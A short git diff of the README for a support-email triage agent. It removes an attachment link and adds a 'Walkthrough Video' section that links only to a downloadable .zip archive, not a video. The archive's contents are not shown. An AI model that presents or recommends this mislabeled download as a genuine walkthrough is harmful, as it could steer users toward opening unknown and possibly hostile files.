@@ -1,4 +1,3 @@
-[README.md](https://github.com/user-attachments/files/32104445/README.md)
 # Support Triage Agent
 
 > A small business gets 40-80 support emails a day. One person manually reads each one,
@@ -8,6 +7,15 @@
 >
 > This agent does the first 90% automatically and hands a human a queue of pre-drafted,
 > pre-classified replies to approve in one click. **Nothing sends without a human approving it.**
+
+---
+## Walkthrough Video
+
+[Email-agent.zip](https://github.com/user-attachments/files/32105689/Email-agent.zip)
+
+
+
+
 
 ---
 
